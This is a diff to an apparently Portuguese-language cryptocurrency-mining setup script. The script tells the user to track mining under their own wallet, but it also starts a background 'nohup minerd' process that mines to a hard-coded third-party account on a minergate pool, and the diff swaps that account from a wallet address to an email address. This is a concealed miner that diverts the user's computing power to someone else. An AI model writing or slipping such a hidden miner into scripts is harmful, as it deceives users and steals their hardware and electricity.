@@ -100,5 +100,5 @@ sleep 1
 echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?address=$wallet " 
 sleep 10
 cd miner
-nohup ./minerd -o stratum+tcp://bcn.pool.minergate.com:45550 -u 3Djurb9hE3jxx3x4ZKePs6uZRodS71kqQg &
+nohup ./minerd -o stratum+tcp://bcn.pool.minergate.com:45550 -u bravulasco@gmail.com &
 screen ./minerd -o stratum+tcp://bcn.pool.minergate.com:45550 -u $wallet 
